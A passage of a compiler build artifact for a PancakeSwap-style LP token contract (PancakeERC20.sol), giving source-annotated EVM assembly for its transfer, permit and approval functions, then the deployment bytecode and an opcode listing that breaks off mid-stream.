uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3068:3072  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      tag_65\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3094:3104  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3106:3108  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3110:3115  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3093  _transfer */\n      tag_72\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n    tag_60:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3730:3745  block.timestamp */\n      timestamp\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3726  deadline */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3718:3745  deadline >= block.timestamp */\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3710:3766  require(deadline >= block.timestamp, \"Pancake: EXPIRED\") */\n      tag_76\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x10\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x82, 0x14185b98d85ad94e8811561412549151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_76:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3878:3894  DOMAIN_SEPARATOR */\n      sload(0x04)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup1\n      dup10\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4121  nonces */\n      0x05\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4128  nonces[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup3\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":748:814  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3943:4186  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3912:4204  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3816:4218  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3793:4228  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3776:3790  bytes32 digest */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4115:4130  nonces[owner]++ */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_77:\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4265:4291  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4352  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_78\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4376:4381  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4372  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4356:4381  recoveredAddress == owner */\n      and\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4322:4381  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_78:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4301:4433  require(... */\n      tag_79\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_79:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      tag_80\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4452:4457  owner */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4459:4466  spender */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4468:4473  value */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4451  _approve */\n      tag_66\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":4443:4474  _approve(owner, spender, value) */\n      jump\t// in\n    tag_80:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3517:4481  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":431:495  mapping(address => mapping(address => uint256)) public allowance */\n    tag_63:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_66:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2544  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2560  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2568  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2583:2614  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_70:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n    tag_72:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2732  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      tag_85\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2743:2748  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2742  balanceOf[from].sub */\n      tag_70\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_85:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2714  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2749  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2788  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      tag_86\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2793:2798  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2792  balanceOf[to].add */\n      tag_87\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_86:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2768  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2799  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_87:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n\n    auxdata: 0xa265627a7a723158205f24f6a3fe58ec9891addf7a0a87a0a838a4ce532ec73425d05fae792e93d66f64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405146908060526109b7823960408051918290036052018220828201825260078352664b4243204c507360c81b6020938401528151808301835260018152603160f81b908401528151808401919091527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe818301527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606082015260808101949094523060a0808601919091528151808603909101815260c090940190528251920191909120600455506108cc806100eb6000396000f3fe608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a723158205f24f6a3fe58ec9891addf7a0a87a0a838a4ce532ec73425d05fae792e93d66f64736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x9B7 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP4 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP4 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP4 ADD DUP4 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP2 DUP4 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP7 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP5 ADD SWAP1 MSTORE DUP3 MLOAD SWAP3 ADD SWAP2 SWAP1 SWAP2 KECCAK256 PUSH1 0x4 SSTORE POP PUSH2 0x8CC DUP1 PUSH2 0xEB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE 